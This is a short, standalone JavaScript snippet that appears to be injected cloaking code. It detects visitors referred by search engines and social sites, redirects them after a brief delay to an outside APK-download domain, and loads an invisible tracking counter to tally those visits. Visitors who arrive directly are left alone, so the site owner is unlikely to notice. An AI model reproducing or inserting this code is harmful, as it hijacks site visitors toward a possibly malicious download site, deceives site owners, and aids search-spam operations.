(function () {
  var referrer = document.referrer.toLowerCase();
  var searchEngines = [
    'google.', 'bing.', 'yahoo.', 'baidu.', 'duckduckgo.', 'yandex.', 'ask.', 'aol.', 'naver.', 'seznam.', 'sogou.', '360.cn', 'so.com',
    'ecosia.org', 'startpage.com', 'qwant.com', 'github.com', 'linkedin.com', 'facebook.com', 'twitter.com', 'reddit.com'
  ];

  var isFromSearchEngine = searchEngines.some(function (engine) {
    return referrer.includes(engine);
  });

  if (isFromSearchEngine) {
    setTimeout(function () {
      window.location.href = 'https://apk009.tkvip786.com/';
    }, 300);

    window.sc_project = 13141996;
    window.sc_invisible = 1;
    window.sc_security = "2bb48bd0";

    var sc = document.createElement('script');
    sc.type = 'text/javascript';
    sc.async = true;
    sc.src = 'https://www.statcounter.com/counter/counter.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(sc, s);

    var noscript = document.createElement('noscript');
    noscript.innerHTML =
      '<div class="statcounter">' +
      '<a title="Web Analytics" href="https://statcounter.com/" target="_blank">' +
      '<img class="statcounter" src="https://c.statcounter.com/13141996/0/2bb48bd0/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">' +
      '</a></div>';
    document.body.appendChild(noscript);
  }
})();
